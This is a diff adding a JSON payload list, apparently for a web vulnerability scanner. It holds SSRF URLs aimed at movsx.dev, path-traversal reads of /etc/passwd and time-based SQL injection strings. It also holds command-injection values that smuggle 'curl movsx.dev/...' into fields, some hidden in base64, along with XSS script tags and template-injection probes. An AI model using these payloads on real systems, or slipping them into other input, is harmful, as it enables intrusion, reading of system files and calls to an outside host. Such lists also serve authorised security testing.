@@ -1,0 +1,226 @@
+[
+  {
+    "attack": "ssrf",
+    "payload": "movsx.dev"
+  },
+  {
+    "attack": "ssrf",
+    "payload": "movsx.dev/test_string"
+  },
+  {
+    "attack": "ssrf",
+    "payload": "/movsx.dev/test_string"
+  },
+  {
+    "attack": "ssrf",
+    "payload": "//movsx.dev/test_string"
+  },
+  {
+    "attack": "ssrf",
+    "payload": "a:b@movsx.dev/test_string"
+  },
+  {
+    "attack": "ssrf",
+    "payload": "a:b@movsx.dev"
+  },
+  {
+    "attack": "ssrf",
+    "payload": "https://movsx.dev/test_string"
+  },
+  {
+    "attack": "ssrf",
+    "payload": "https:%2f%2fmovsx.dev%2ftest_string"
+  },
+  {
+    "attack": "ssrf",
+    "payload": "%68%74%74%70%73%3a%2f%2fmovsx.dev%2ftest_string"
+  },
+  {
+    "attack": "lfi",
+    "payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+  },
+  {
+    "attack": "lfi",
+    "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64"
+  },
+  {
+    "attack": "lfi",
+    "payload": "/etc/passwd"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12'+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12\"+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12)+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12')+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12\")+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "123)+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "123')+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "123\")+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "123'+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "123\"+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "1234+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12345'+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12345\"+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12345+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12345')+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12345\")+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "12345)+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "abcd+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "abcd'+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "abcd\"+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "abcd)+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "abcd')+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "sqli",
+    "payload": "abcd\")+AND+SLEEP(15)--+"
+  },
+  {
+    "attack": "cmd",
+    "payload": "test|curl+movsx.dev/test_string2"
+  },
+  {
+    "attack": "cmd",
+    "payload": "test;curl+movsx.dev/test_string2"
+  },
+  {
+    "attack": "cmd",
+    "payload": "test%60curl+movsx.dev/test_string2"
+  },
+  {
+    "attack": "cmd",
+    "payload": "test%0d%0acurl+movsx.dev/test_string2"
+  },
+  {
+    "attack": "cmd",
+    "payload": "dGVzdHxjdXJsIG1vdnN4LmRldi90ZXN0X3N0cmluZzMK"
+  },
+  {
+    "attack": "cmd",
+    "payload": "dGVzdDtjdXJsIG1vdnN4LmRldi90ZXN0X3N0cmluZzMK"
+  },
+  {
+    "attack": "cmd",
+    "payload": "dGVzdCYmY3VybCBtb3ZzeC5kZXYvdGVzdF9zdHJpbmczCg=="
+  },
+  {
+    "attack": "cmd",
+    "payload": "dGVzdCUwZCUwYWN1cmwgbW92c3guZGV2L3Rlc3Rfc3RyaW5nMwo="
+  },
+  {
+    "attack": "xss",
+    "payload": "%0d%0aXSTRINGX"
+  },
+  {
+    "attack": "xss",
+    "payload": "%0d%0a%0d%0aXSTRINGX"
+  },
+  {
+    "attack": "ssti",
+    "payload": "{{4*4}}"
+  },
+  {
+    "attack": "ssti",
+    "payload": "#{{4*4}}"
+  },
+  {
+    "attack": "ssti",
+    "payload": "${{4*4}}"
+  },
+  {
+    "attack": "xss",
+    "payload": "\"><script>alert('XSTRINGX')</script>"
+  },
+  {
+    "attack": "xss",
+    "payload": "><script>alert('XSTRINGX')</script"
+  },
+  {
+    "attack": "xss",
+    "payload": "<script>alert('XSTRINGX')</script>"
+  },
+  {
+    "attack": "xss",
+    "payload": "\"></iframe><script>alert('XSTRINGX')</script>"
+  },
+  {
+    "attack": "ssrf",
+    "payload": "Ly9tb3ZzeC5kZXYvCg=="
+  },
+  {
+    "attack": "ssrf",
+    "payload": "aHR0cHM6Ly9tb3ZzeC5kZXYvdGVzdF9zdHJpbmdiCg=="
+  },
+  {
+    "attack": "ssrf",
+    "payload": "Ij48c2NyaXB0PmFsZXJ0KCdYU1RSSU5HWCcpPC9zY3JpcHQ+Cg=="
+  }
+]
